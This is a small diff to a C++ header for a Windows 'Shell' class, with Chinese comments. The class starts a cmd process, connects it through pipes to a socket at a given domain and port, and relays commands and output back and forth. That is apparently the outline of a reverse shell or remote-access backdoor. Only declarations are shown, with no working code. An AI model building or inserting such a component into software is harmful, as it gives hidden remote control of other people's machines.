@@ -13,10 +13,10 @@ class Shell
 public:
 	// 本类入口函数 创建cmd进程并做好管道连接 并开启线程
 	static void startShell(std::string domain, int port);
-	// 线程函数 负责读管道并转发
-	static DWORD WINAPI threadReadPipe(LPVOID args);
-	// 线程函数 负责读socket并转发
+	// 线程函数 负责读socket并转发 负责命令输入
 	static DWORD WINAPI threadReadSock(LPVOID args);
+	// 接收cmd回显并传送
+	static void flushResults();
 	// 启动cmd子进程并准备好管道
 	static bool createCmd();
 };
